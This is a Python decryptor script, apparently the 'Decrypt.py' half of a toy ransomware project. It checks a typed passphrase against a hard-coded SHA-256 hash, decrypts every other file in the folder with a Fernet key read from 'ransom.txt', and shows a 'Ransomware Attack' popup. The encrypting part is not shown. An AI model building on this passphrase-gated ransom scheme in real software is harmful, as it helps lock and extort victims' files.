#!/usr/bin/env python3

import os
import hashlib
from cryptography.fernet import Fernet
import tkinter as tk
from tkinter import messagebox

files = []
for file in os.listdir():
    if file == "ransomware.py" or file == "ransom.txt" or file == "Decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

with open("ransom.txt","rb") as key:
    secretkey = key.read()

secret_phrase = "96dfc5bedbd41385e70408e502b7e12f2d06c0dd226cf9d8adc8e17a839b63f0"
user_phrase = input("Enter secret key to decrypt !\n>>> ")

if hashlib.sha256(user_phrase.encode()).hexdigest() == secret_phrase:
    for file in files:
        with open(file,"rb") as thefile:
            contents = thefile.read()
        contents_decrypted = Fernet(secretkey).decrypt(contents)
        with open(file,"wb") as thefile:
            thefile.write(contents_decrypted)
  

    print(">>> Congratulations! Your Files are Decrypted Successfully :) <<<")      
    root = tk.Tk()
    root.withdraw()
    messagebox.showerror("Ransomware Attack", "Congratulation! All of your files have been Decrypted!") 
    root.destroy()

else:
    print(">>> Wrong secret Key! :) <<<")     





